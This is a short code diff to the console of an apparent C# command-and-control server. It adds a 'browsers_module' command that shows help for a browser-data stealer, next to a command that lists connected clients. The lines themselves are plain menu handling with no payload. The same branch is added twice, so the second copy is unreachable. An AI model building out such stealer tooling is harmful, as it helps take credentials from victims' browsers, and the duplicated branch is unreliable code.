@@ -56,9 +56,17 @@ namespace Server
                     {
                         Menu.ShowHelp();
                     }
+                    else if (input.Trim().ToLower() == "browsers_module")
+                    {
+                        Menu.ShowStealerHelp();
+                    }
                     else if (input.Trim().ToLower() == "clients")
                     {
                         ServerSocket.ListClients();
+                    }
+                    else if (input.Trim().ToLower() == "browsers_module")
+                    {
+                        Menu.ShowStealerHelp();
                     }
                     else if (input.Trim().ToLower() == "exit")
                     {
